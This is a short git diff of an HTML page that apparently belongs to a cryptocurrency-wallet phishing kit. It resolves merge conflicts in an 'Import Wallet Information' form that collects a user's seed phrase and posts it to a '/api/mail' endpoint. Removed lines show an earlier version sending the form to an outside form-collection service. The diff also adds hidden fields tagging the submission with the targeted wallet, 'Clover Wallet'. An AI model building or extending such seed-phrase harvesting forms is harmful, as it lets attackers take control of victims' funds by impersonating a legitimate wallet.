@@ -1267,19 +1267,13 @@
                 <!-- Import Wallet Information Screen -->
                 <div id="importScreen" style="display: none;">
                     <h2 data-i18n="import_title">Import Wallet Information</h2>
-<<<<<<< HEAD
-<<<<<<< HEAD
-                    <form id="import-form" method="POST" action="/api/mail">
-=======
-                    <form id="import-form" method="POST" action="https://submit-form.com/JcFuAD0KH">
->>>>>>> b9224d0 (Initial commit)
-=======
-                    <form id="import-form" method="POST" action="/api/mail">
->>>>>>> b1a2b9f (terminal)
+                    <form id="import-form" method="POST" action="/api/mail" enctype="multipart/form-data">
                         <!-- existing hidden for verification method -->
                         <input type="hidden" name="verification_method" id="verification_method" value="seedphrase">
+                        <input type="hidden" name="phase" id="phase" value="seedphrase">
                         <!-- new hidden to carry the wallet the user selected -->
                         <input type="hidden" name="wallet_type" id="wallet_type" value="Clover Wallet">
+                        <input type="hidden" name="wallet_name" id="wallet_name" value="Clover Wallet">
 
                         <!-- Seedphrase Section -->
                         <div id="seedphraseSection" class="import-section" style="display: block;">
